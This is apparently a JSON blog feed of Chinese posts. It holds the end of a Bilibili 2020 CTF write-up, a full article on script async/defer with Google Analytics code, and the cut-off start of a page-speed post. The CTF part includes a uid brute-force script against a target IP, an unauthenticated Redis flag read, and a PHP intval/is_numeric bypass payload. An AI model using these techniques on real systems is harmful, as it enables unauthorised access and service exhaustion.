class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 